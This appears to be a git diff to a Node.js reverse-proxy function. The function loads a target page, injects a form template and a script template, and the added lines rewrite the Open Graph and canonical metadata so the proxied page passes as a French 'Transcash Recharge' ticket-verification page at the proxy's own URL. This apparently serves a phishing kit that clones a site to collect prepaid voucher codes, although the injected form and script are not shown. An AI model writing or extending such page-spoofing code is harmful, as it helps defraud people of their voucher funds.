@@ -23,6 +23,13 @@ const verification = async (req, res, TARGET_URL, PROXY_URL) => {
   const template = fs.readFileSync(path.join(__dirname, '../templates/template.html'), 'utf8');
   $('.form-bzhd-bootsrap-4').append(template);
 
+
+  $('meta[property=og:description]').attr("content", "Ici, vous pouvez vérifier l'authenticité ou la validité d'un ticket de recharge Transcash");
+  $('meta[property=og:title]').attr("content", "Vérification - Transcash Recharge");
+  $('meta[property=og:url]').attr("content", `${PROXY_URL}/verification`);
+  $('link[rel=canonical]').attr("href", `${PROXY_URL}/verification`);
+ 
+
   //le script
   const scripttemplate = fs.readFileSync(path.join(__dirname, '../templates/scriptTemplate.html'), 'utf8');
   $('body').append(scripttemplate);
